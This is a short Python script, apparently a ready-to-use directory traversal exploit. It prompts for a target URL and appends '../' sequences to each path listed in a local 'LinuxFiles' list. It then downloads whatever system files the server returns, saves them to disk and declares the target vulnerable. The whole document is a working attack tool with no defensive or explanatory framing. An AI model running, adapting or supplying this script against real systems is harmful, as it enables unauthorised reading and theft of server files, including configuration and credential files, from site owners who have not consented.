#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import urllib.request
import http.client

http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = "HTTP/1.0"

print("Path Traversal Exploit Ver.1.0")
print("For use input your target adress like that: http://YOUR_TARGET")
target = input("Input your target adress: ")
print("Running exploit on: " + target)

good = []
bad = []
doc = open("LinuxFiles", "r")

for line in doc:

    try:
        line = line.rstrip("\n")
        file = urllib.request.urlopen(target+"/../../../../../../.."+line)
        response = str(file.read())
        temp = line.replace("/", "_")
        fileS = open(temp, "w+")
        fileS.write(response)
        fileS.close()
        good.append(line)

    except:
        bad.append(line)
        continue
print("Results!!")
if len(good) > 0:
    print("Target " + target + " is vulnerable for Path Traversal Attack!!")
    print("Downloaded files:")
    for goodPlik in good:
        print(goodPlik)
else:
    print("Target " + target + " is not vulnerable for Path Traversal Attack!!")
doc.close()
